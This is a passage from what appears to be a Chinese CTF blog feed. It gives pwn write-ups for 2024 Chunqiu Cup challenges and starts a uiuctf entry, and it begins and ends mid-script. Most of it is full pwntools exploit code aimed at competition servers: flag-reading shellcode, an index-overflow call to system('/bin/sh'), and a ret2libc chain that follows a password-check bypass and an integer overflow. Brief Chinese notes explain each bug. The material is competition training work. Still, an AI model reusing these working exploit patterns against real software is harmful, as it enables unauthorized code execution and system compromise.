a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./Shuffled_Execution&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;/home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;</span>)  <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;8.147.128.22&quot;</span>,<span class="hljs-number">45267</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-comment"># dbg()</span><br><br>ss = <span class="hljs-string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#125;&#123;-&quot;</span><br>l = [<span class="hljs-built_in">ord</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ss]<br><br>shellcode = asm(shellcraft.openat(-<span class="hljs-number">100</span>, <span class="hljs-string">&#x27;flag&#x27;</span>))<br>shellcode += asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>shellcode += asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">           add rsp,0x300</span><br><span class="hljs-string">           push 0x40</span><br><span class="hljs-string">           push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shellcode += asm(shellcraft.writev(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x1560)&#x27;)</span><br>sl(asm(<span class="hljs-string">&quot;jmp $+2&quot;</span>)+asm(<span class="hljs-string">&quot;mov rsp,rax;add rsp,0x300&quot;</span>)+shellcode)<br><span class="hljs-comment"># print(asm(&quot;jmp $+2&quot;)+shellcode)</span><br><br><br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="spiiill"><a href="#spiiill" class="headerlink" title="spiiill"></a>spiiill</h2><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/6.png" class=""><p></p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/7.png" class=""><p>​有system函数，但是是数组0xc的功能，这里超过0xb就会退出</p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/8.png" class=""><p>​但是0xa功能还可以调用，所以这里可以先调用0xa再去0xc，至于这个输入的偏移，调试就完了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)  <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;8.147.135.82&quot;</span>,<span class="hljs-number">42606</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>sla(<span class="hljs-string">b&#x27;choice: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><br><span class="hljs-comment"># pay = p64(0xa)</span><br><span class="hljs-comment"># for i in range((0x400-8)//8):</span><br><span class="hljs-comment">#     pay += p64(i)</span><br><br>pay = p64(<span class="hljs-number">0xa</span>) + p64(<span class="hljs-number">0xc</span>) + p64((<span class="hljs-number">0x10000000000000000</span> - <span class="hljs-number">0x1ff0</span>)//<span class="hljs-number">8</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>sla(<span class="hljs-string">b&#x27;see you&#x27;</span>,pay)<br><br><span class="hljs-comment"># dbg()</span><br><br>sla(<span class="hljs-string">b&#x27;choice: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="simpleSys"><a href="#simpleSys" class="headerlink" title="simpleSys"></a>simpleSys</h2><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/9.png" class=""><p>​整型溢出，前提是可以登录root</p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/10.png" class=""><p>​将输入的密码base64加密后比较是否正确，但是这里有个坑</p><img src="/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/11.png" class=""><p>​这里比较的话可以看到后面藏着个\x01，所以这里就输满让他，由于就在他上面，就会\x00截断，这样strlen也会受到影响，之后就是ret2libc了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./main&#x27;</span><br>elf = ELF(file)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)  </span><br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">39628</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><br>data = <span class="hljs-string">&quot;dGhpcyBpcyBwYXNzd29yZA==&quot;</span> + <span class="hljs-string">b&#x27;\x01&#x27;</span>.decode()<br>d1 = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>decode = base64.b64decode(data)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(decode)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01600)&#x27;)</span><br>sla(<span class="hljs-string">b&#x27;username: &#x27;</span>,<span class="hljs-string">b&#x27;root&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;password: &#x27;</span>,decode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">b&#x27;\x11&#x27;</span>))<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x1515)&#x27;)</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>sla(<span class="hljs-string">b&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br>s(<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">4</span>) + <span class="hljs-string">b&#x27;stop&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;stop&#x27;</span>)<br><br>pie = u64(pw.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1808</span><br>lss(<span class="hljs-string">&#x27;pie&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;[y/n]&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)<br><br><br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x1515)&#x27;)</span><br>rdi = pie + <span class="hljs-number">0x001751</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>sla(<span class="hljs-string">b&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br>sl(<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x68</span>) + p64(rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]+pie) + p64(pie+elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(pie+<span class="hljs-number">0x01808</span>)) <br><span class="hljs-comment"># sl(cyclic(0x68) + p64(rdi))</span><br>sla(<span class="hljs-string">b&#x27; [y/n]&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>puts = u64(pw.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lss(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system,binsh = search()<br><br>rdi = pie + <span class="hljs-number">0x001751</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>sla(<span class="hljs-string">b&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br>sl(<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x68</span>) + p64(rdi+<span class="hljs-number">1</span>) + p64(rdi) + p64(binsh) + p64(system) + p64(pie+<span class="hljs-number">0x01808</span>)) <br><span class="hljs-comment"># sl(cyclic(0x68) + p64(rdi))</span><br>sla(<span class="hljs-string">b&#x27; [y/n]&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br><br><span class="hljs-comment"># pay</span><br><br><br><br><br>pwpw()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024uiuctf</title>
    <link href="/2024/07/01/uiuctf/"/>
    <url>/2024/07/01/uiuctf/</url>
    
    <content type="html"><![CDATA[<h1 id="uiuctf"><a href="#uiuctf" class="headerlink" title="uiuctf"></a><center>uiuctf</h1><h2 id="Syscalls"><a href="#Syscalls" class="headerlink" title="Syscalls"></a>Syscalls</h2><p>侧信道爆破，注意flag文件的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        